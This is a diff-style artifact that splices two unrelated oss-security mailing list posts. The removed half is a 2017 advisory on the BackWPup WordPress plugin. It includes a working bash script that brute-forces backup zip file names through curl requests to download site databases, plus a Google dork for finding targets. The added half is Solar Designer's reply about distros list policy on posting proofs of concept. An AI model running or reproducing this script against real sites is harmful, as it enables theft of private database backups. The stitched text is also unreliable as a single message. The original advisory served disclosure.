@@ -1,87 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/27/9
-Message-id: <A9D8E9DF-36AC-4F46-BAF1-0C6E002E0D71@me.com>
-Date: Wed, 27 Sep 2017 12:13:47 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/13/1
+Message-ID: <20171113145336.GA23241@openwall.com>
+Date: Mon, 13 Nov 2017 15:53:36 +0100
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Security risk of server side text editing in general and vim.tiny specifically
 Content-Type: text/plain; charset=utf-8
 
-Title: Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-09-08
-CVE-ID:[CVE-2017-2551]
-Download Site: https://wordpress.org/plugins/backwpup
-Vendor: Inpsyde
-Vendor Notified: 2017-09-08, fixed v3.4.2
-Vendor Contact: plugins@...dpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=201
-Description: "The backup plugin BackWPup can be used to save your complete installation including /wp-content/ and push them to an external Backup Service, like Dropbox, S3, FTP and many more."
-Vulnerability:
-There is a weakness in the way backwpup creates and stores the backup files it generates.  It creates a random string to obscure the location, but
-it uses that same string to create the storage directory under wp-content/uploads/ which in most installations of WordPress allows file listings.
+On Fri, Nov 03, 2017 at 11:07:14AM +0000, Fiedler Roman wrote:
+> PS: POC for vim.tiny on Ubuntu Xenial to overwrite arbitrary files as user root when editing file in directory owned by other user is available on request, disclosure after one week or if list discussion indicates other timing.
 
-Someone looking to steal a copy of the database could simply list the directories in /uploads to find that random string and then brute force the location of the file as its structure is just a date and time stamp.  It would take a Maximum of 86400 tries to guess if a backup is available for that day.  
-Filename format: 
-backwpup_ RANDOMSTRINGBACKUPNUMBER_%Y-%m-%d_%H-%i-%s
+Please post this PoC in here ASAP.  Right now, you're in violation of
+distros list policy for having posted the PoC in there yet not made it
+public on oss-security within 7 days after posting about the issue
+itself in here.  Please correct this.  (To me this is also an example of
+misuse of the distros list, and then of the ability to delay posting the
+PoC - creating administrative work for all of us out of thin air.)
 
-Default settings are:
+The policy:
 
-%d = Two digit day of the month, with leading zeros
-%m = Day of the month, with leading zeros
-%Y = Four digit representation for the year
-%H = Hour in 24-hour format, with leading zeros
-%i = Two digit representation of the minute
-%s = Two digit representation of the second
+http://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-instructions-for-reporters
 
-https://wordpress.org/plugins/backwpup
+"If you shared exploit(s) that are not an essential part of the issue
+description, then at your option you may slightly delay posting them to
+oss-security but you must post the exploits to oss-security within at
+most 7 days"
 
+Also, it looks like Gentoo and Amazon failed to track this and remind
+you on November 10.  They should have, as per:
 
-Exploit Code:
-	• #!/bin/bash
-	• #Exploit for Wordpress Plugin BackWPup v3.4.1
-	• #Download https://wordpress.org/plugins/backwpup
-	• #CWE-552: Files or Directories Accessible to External Parties
-	• #CVE-ID: CVE-2017-2551
-	• #Google Dork: inurl:wp-content/uploads/backwpup
-	•  
-	•  
-	• #Add banner about vulnerability
-	•  
-	• KEY=`curl --silent http://$1/wp-content/uploads/|html2text |grep backups | awk -F- '{print $2}'`
-	•  
-	• #Add error checking here
-	• echo "[+] Getting Unique Key $KEY"
-	• DIR="backwpup-$KEY-backups"
-	• echo "[+] Checking directory $DIR"
-	• WPATH="$DIR/backwpup_$KEY"
-	• echo "[+] Creating Path: $WPATH"
-	• #use date command here for the default date of current day
-	• MONTH=09
-	• DAY=07
-	• YEAR=2017
-	• Z=0
-	•  
-	• echo "[+] Scanning website for available backups:"
-	• for y in `seq -w 0 23`; do
-	•         for x in `seq -w 0 59`; do
-	•                  Y=`echo "scale=2;($Z/86000)*100"|bc`;
-	•                  echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CWPATH $Y%"
-	•         for z in `seq -w 0 59`; do
-	•                  Z=$(( $Z + 1 ));
-	•                  CWPATH="http://$1/wp-content/uploads/$WPATH"01"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";
-	•                  RESULT=`curl -s --head $CWPATH|grep 200`;
-	•                 if [ -n "$RESULT" ]; then
-	•                  echo ""
-	•                  echo "[+] Location $CWPATH Found";
-	•                  echo "[+] Received $RESULT";
-	•                  echo "Downloading......";
-	•                 # wget $CWPATH
-	•                   exit;
-	•                 fi;
-	•         done
-	•         done
-	• done
-	• echo "Completed."
-Screen Shots:
-Notes: Google Dork: inurl:wp-content/uploads/backwpup
+http://oss-security.openwall.org/wiki/mailing-lists/distros#contributing-back
+
+"12. If exploit(s) were shared on the list, make sure that either
+they're included in the oss-security posting along with the issue detail
+or the posting includes an announcement of planned later posting of the
+exploits (with the delay being within list policy), and in the latter
+case also make sure that the later posting is in fact made as planned,
+and remind the reporter if not - primary: Gentoo, backup: Amazon"
+
+So at least this worked as an almost failed test of our handling of this
+little administrative task.  Maybe on some other occasion it would be
+actually important, so let's debug and fix it now.
+
+Alexander
